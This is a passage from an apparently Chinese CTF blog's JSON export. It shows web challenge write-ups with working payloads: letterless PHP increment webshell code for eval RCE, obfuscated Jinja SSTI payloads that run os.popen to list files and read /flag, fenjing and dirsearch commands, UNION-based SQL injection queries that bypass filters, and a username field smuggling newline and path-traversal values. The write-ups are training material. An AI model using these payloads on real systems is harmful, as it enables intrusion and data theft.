{\u0026#34;username\u0026#34;: \u0026#34;???\\n,../../../,record_banned,1,\u0026#34;,\u0026#34;password\u0026#34;: \u0026#34;111111111111\u0026#34;,} def register(sess: Session): resp = sess.post(basic + \u0026#34;/register.php\u0026#34;, data=data) def login(sess: Session): resp = sess.post(basic + \u0026#34;/login.php\u0026#34;, data=data) def post(sess: Session): data1 = { \u0026#34;title\u0026#34;: \u0026#34;敏感词\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;tset\u0026#34;, } resp = sess.post(basic + \u0026#34;/post.php\u0026#34;, data=data1) if __name__ == \u0026#34;__main__\u0026#34;: sess = Session() register(sess) login(sess) post(sess) ","date":"2025-03-26T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-%E9%95%BF%E5%9F%8E%E6%9D%AF-ccforum/","title":"2025-长城杯-ccforum"},{"content":"ez_php 这题前面简单，不多说\n1 2 post传：a[]=1\u0026amp;b[]=2 get传:?password=123456a 解法一日志包含 接下来我打的是日志包含，算是非预期\n各发包2次哈\n解法二打自增 文件包含读取后，有base64字符（还一个非预期直接/file就能出flag）\n1 file=php://filter/read=convert.base64-encode/resource=level2.php 解码得到\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php error_reporting(0); if (isset($_POST[\u0026#39;rce\u0026#39;])) { $rce = $_POST[\u0026#39;rce\u0026#39;]; if (strlen($rce) \u0026lt;= 120) { if (is_string($rce)) { if (!preg_match(\u0026#34;/[!@#%^\u0026amp;*:\u0026#39;\\-\u0026lt;?\u0026gt;\\\u0026#34;\\/|`a-zA-Z~\\\\\\\\]/\u0026#34;, $rce)) { eval($rce); } else { echo(\u0026#34;Are you hack me?\u0026#34;); } } else { echo \u0026#34;I want string!\u0026#34;; } } else { echo \u0026#34;too long!\u0026#34;; } } ?\u0026gt; 这里无字母rce，且过滤了^,~,|,那只能打自增（其实也可以fuzz一下看看可以用哪些）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php // 定义正则表达式 $pattern = \u0026#34;/[a-zA-Z0-9@#%^\u0026amp;*:{}\\-\u0026lt;\\?\u0026gt;\\\u0026#34;|`~\\\\\\\\]/\u0026#34;; // 存储未被过滤的字符 $unfilteredChars = []; // 遍历 ASCII 码从 32 到 127 for ($i = 32; $i \u0026lt;= 127; $i++) { $char = chr($i); // 获取对应的字符 if (!preg_match($pattern, $char)) { // 检查是否未被过滤 $unfilteredChars[] = $char; // 添加到未过滤字符数组 } } // 输出未被过滤的字符 echo \u0026#34;未被过滤的字符: \u0026#34; . implode(\u0026#39;\u0026#39;, $unfilteredChars) . \u0026#34;\\n\u0026#34;; ?\u0026gt; 那显然只能打自增\n自增规则简单，比如$a=\u0026lsquo;A\u0026rsquo;;$a++=\u0026lsquo;B\u0026rsquo;,所以只要一个字母A,我就可以构造一个$_GET,这样就可以给 _ 还有__赋值（这里有数字，但是还是用_,因为我这个照着无数字字母rce打，相当于通用payload），从而到达命令执行的目的,那这个A怎么的得到?\n在php中，数组与字符串连接，会被转换成字符串，值就是Array,那就相对于拿到了所有字母\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php $_=[].\u0026#39;\u0026#39;;//Array $_=$_[\u0026#39;\u0026#39;==\u0026#39;$\u0026#39;];//A $_++;//B $_++;//C $_++;//D $_++;//E $__=$_;//E $_++;//F $_++;//G $___=$_;//G $_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;//T $_=$___.$__.$_;//GET //var_dump($_); $_=\u0026#39;_\u0026#39;.$_;//_GET var_dump($$_[_]($$_[__])); //$_GET[_]($_GET[__]) 接下来就可以尝试去给_和__GET传参，这里我们需要把换行的都去掉，然后进行一次URL编码，因为中间件会解码一次，所以我们构造的payload先变成这样\n1 $_=[].\u0026#39;\u0026#39;;$_=$_[\u0026#39;\u0026#39;==\u0026#39;$\u0026#39;];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$__.$_;$_=\u0026#39;_\u0026#39;.$_;$$_[_]($$_[__]); 然后是\n1 %24_%3D%5B%5D.\u0026#39;\u0026#39;%3B%24_%3D%24_%5B\u0026#39;\u0026#39;%3D%3D\u0026#39;%24\u0026#39;%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D\u0026#39;_\u0026#39;.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B 但是这个paylaod不行，因为限制了字符，还是要利用数字，所以应该打$_GET[1] ($_GET[2])\n1 2 3 4 5 6 7 8 9 $_=[]._;//Array $__=$_[1];//r $_=$_[0];//A $_++;//B $_1=++$_;//$_1=C,$_=D(这里是前缀++，即先自增一再赋值) $_++;$_++;$_++;$_++;//$_=H $_=$_1.++$_.$__;//CHr $_=_.$_(71).$_(69).$_(84);//_GET $$_[1]($$_[2]); //$_GET[1]$_GET[2] 1 %24_%3D%5B%5D._%3B%24__%3D%24_%5B1%5D%3B%24_%3D%24_%5B0%5D%3B%24_%2B%2B%3B%24_1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24_1.%2B%2B%24_.%24__%3B%24_%3D_.%24_(71).%24_(69).%24_(84)%3B%24%24_%5B1%5D(%24%24_%5B2%5D)%3B%20 这里是118个字符，比较极限，下面更好，只有111字符\n1 2 3 4 5 6 7 8 9 10 11 12 $_=([]._){0}; //A $_++; $_1=++$_; //$_1=C $_++; $_++; $_++; $_++; $_1.=++$_.([]._){1}; //$_1=CHr $_=_.$_1(71).$_1(69).$_1(84); //$_=_GET $$_[1]($$_[2]); //$_GET[1]($_GET[2]) //缩短为一行 $_=([]._){0};$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_1.=++$_.([]._){1};$_=_.$_1(71).$_1(69).$_1(84);$$_[1]($$_[2]); [从CTFShowRCE挑战]中学习自增构造webshell-腾讯云开发者社区-腾讯云\n对于RCE和文件包含的一点总结 | root@wanth3f1ag\n[HNCTF] challenge_rce - Boogiepop Doesn\u0026rsquo;t Laugh\nCoding Loving-ssti 有源码先审计代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 from flask import Flask, request, render_template, session, url_for app = Flask(__name__) app.secret_key = \u0026#39;Ciallo～(∠・ω ＜）⌒★\u0026#39; # 设置应用密钥，用于会话加密 # 定义过滤关键词列表 FILTER_KEYWORDS = [\u0026#39;Ciallo～(∠・ω ＜）⌒★\u0026#39;] TIME_LIMIT = 1 # 时间限制，未在代码中使用 # 定义函数，检查输入中是否包含禁止的关键词 def contains_forbidden_keywords(complaint): for keyword in FILTER_KEYWORDS: if keyword.lower() in complaint: # 检查关键词是否在输入中（不区分大小写） return True return False @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) # 定义路由 \u0026#39;/\u0026#39;，支持 GET 和 POST 方法 def index(): session[\u0026#39;user\u0026#39;] = \u0026#39;test\u0026#39; # 设置会话中的用户为 \u0026#39;test\u0026#39; command = request.form.get(\u0026#39;cmd\u0026#39;, \u0026#39;coding\u0026#39;) # 获取表单中的 \u0026#39;cmd\u0026#39; 值，默认为 \u0026#39;coding\u0026#39; return render_template(\u0026#39;index.html\u0026#39;, command=command) # 渲染 index.html 模板，传递 command 参数 @app.route(\u0026#39;/test\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) # 定义路由 \u0026#39;/test\u0026#39;，支持 GET 和 POST 方法 def shell(): if session.get(\u0026#39;user\u0026#39;) != \u0026#39;test\u0026#39;: # 检查会话中的用户是否为 \u0026#39;test\u0026#39; return render_template(\u0026#39;Auth.html\u0026#39;) # 如果不是，渲染 Auth.html 模板（可能是登录页面） if (abc := request.headers.get(\u0026#39;User-Agent\u0026#39;)) is None: # 获取 User-Agent 头，如果不存在 return render_template(\u0026#39;Auth.html\u0026#39;) # 返回 Auth.html 模板 cmd = request.args.get(\u0026#39;cmd\u0026#39;, \u0026#39;试一试\u0026#39;) # 获取 URL 参数中的 \u0026#39;cmd\u0026#39; 值，默认为 \u0026#39;试一试\u0026#39; if request.method == \u0026#39;POST\u0026#39;: # 如果是 POST 请求 css_url = url_for(\u0026#39;static\u0026#39;, filename=\u0026#39;style.css\u0026#39;) # 生成静态文件 style.css 的 URL command = request.form.get(\u0026#39;cmd\u0026#39;) # 获取表单中的 \u0026#39;cmd\u0026#39; 值 if contains_forbidden_keywords(command): # 检查命令中是否包含禁止的关键词 return render_template(\u0026#39;forbidden.html\u0026#39;) # 如果包含，渲染 forbidden.html 模板 # 使用 render_template_string 渲染一个 HTML 字符串，传递 command 和 css_url 参数 return render_template_string(f\u0026#39;\u0026#39;\u0026#39; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Loving Music\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;{css_url}\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;\u0026lt;url id=\u0026#34;cvh0d9sc75rev485mjl0\u0026#34; type=\u0026#34;url\u0026#34; status=\u0026#34;failed\u0026#34; title=\u0026#34;\u0026#34; wc=\u0026#34;0\u0026#34;\u0026gt;https://fonts.googleapis.com/css2?family=Poppins:wght@400\u0026lt;/url\u0026gt; ;600\u0026amp;display=swap\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Loving coding\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;emoji\u0026#34;\u0026gt;🧑‍💻\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;{command}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;\u0026#39;\u0026#39;, command=command, css_url=css_url) return render_template(\u0026#39;shell.html\u0026#39;, command=cmd) # 如果是 GET 请求，渲染 shell.html 模板，传递 cmd 参数 显然这里漏洞点在render_template_string ，这个与ssti密不可分（render_template_string函数在渲染模板的时候使用了%s来动态的替换字符串，在渲染的时候会把 {undefined{**}} 包裹的内容当做变量解析替换。）\nFlask的渲染方法函数\u0026mdash;render_template()/render_template_string()-CSDN博客\n所以就是打ssti(在/test路由，cmd是参数)，先fuzz一下，这些都是没过滤的\n下面是过滤的（下面还一些关键词，那些无所谓，直接引号绕过了），显然，困难的是数字，下划线过滤了，因为下划线过滤了，一般用request加attr，或者编码，但是数字和点过滤了，这让我束手无策。\n那就直接fenjing跑！\n一开始我直接跑fenjing跑不出，一般默认跑fenjing基本跑不出，要根据题目加点参数才行。这个fenjing跑要带路由，cookie，不然跑不出。这里我猜猜原因，这里设置了seesion会话用户是test，后面还进行了验证，所以要带上seesion才行。\nfenjing如果你是pip下载就打\n1 fenjing crack --url http://node6.anna.nssctf.cn:23137/test --cookies session=eyJ1c2VyIjoidGVzdCJ9.Z-ICRg.6h9VWlD5DS5HIzdu7uCxabtUeVQ --inputs cmd --method POST 不然就命令行前加pyhton -m就行\n1 python -m fenjing crack --url http://node6.anna.nssctf.cn:23137/test --cookies session=eyJ1c2VyIjoidGVzdCJ9.Z-ICRg.6h9VWlD5DS5HIzdu7uCxabtUeVQ --inputs cmd --method POST 然后执行命令就行\n这里给出payload：ls\n1 cmd={{((cycler[\u0026#39;next\u0026#39;][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;GLOBALS\u0026#39;|lower+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;builtins\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;import\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count](\u0026#39;os\u0026#39;))[\u0026#39;popen\u0026#39;](((lipsum()|urlencode|first+\u0026#39;c\u0026#39;)*(x,x,x,x)|count)|format(((x,x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count),(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x,x)|count)*(x,x,x,x,x)|count),((x,x,x,x,x,x,x,x)|count*(x,x,x,x)|count),((x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x)|count))))[\u0026#39;r\u0026#39;\u0026#39;ead\u0026#39;]()}} cat /flag\n1 cmd={{((cycler[\u0026#39;next\u0026#39;][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;GLOBALS\u0026#39;|lower+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;builtins\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;import\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count](\u0026#39;os\u0026#39;))[\u0026#39;popen\u0026#39;](((lipsum()|urlencode|first+\u0026#39;c\u0026#39;)*(x,x,x,x,x,x,x,x,x)|count)|format(((x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x,x,x,x)|count),(((x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x)|count)*(x,x,x,x)|count),((x,x,x,x,x,x,x,x)|count*(x,x,x,x)|count),((x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x)|count),((x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))))[\u0026#39;r\u0026#39;\u0026#39;ead\u0026#39;]()}} 总结，fenjing还是很强，以前不会用，以后注意一定要带上参数\nlight_pink-sql 这题是考sql，但是有非预期\n非预期 拿dirsearch扫一下\n1 python dirsearch.py -u http://node6.anna.nssctf.cn:23588/ db.php没有东西，但是shell.php有好东西\n直接有eval了，我这可以直接打一句话木马了！\n但是！这里有phpinfo!,所以我猜测一下可能会有flag，直接搜flag或者nss，发现flag在环境变量\n预期解 预期解显然就是打sql\n先打1'#%23(%23就是#，\u0026ndash;+被过滤了)\n然后试1' order by 5%23(试到6报错)\n然后看看哪有回显，但是报错，原因是-被禁用\n果然-被禁，结果是4是回显\n1 0\u0026#39; union select 1,2,3,4,5%23 接下来找表\n1 0\u0026#39; union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema=database()%23 显示不可以哦=，所以应该是**=被过滤，用like代替**\n1 0\u0026#39; union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema like database()%23 查列\n1 0\u0026#39; union select 1,2,3,group_concat(column_name),5 from information_schema.columns where table_name like \u0026#39;Cute\u0026#39;%23 查flag\n1 0\u0026#39; union select 1,2,3,group_concat(Happy),5 from Cute%23 此题过滤了-还有=,但是还是比较友好，毕竟报错还是有提示，是一个不错的sql题\n","date":"2025-03-26T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/nss-round28-web/","title":"nss-round28-web"}]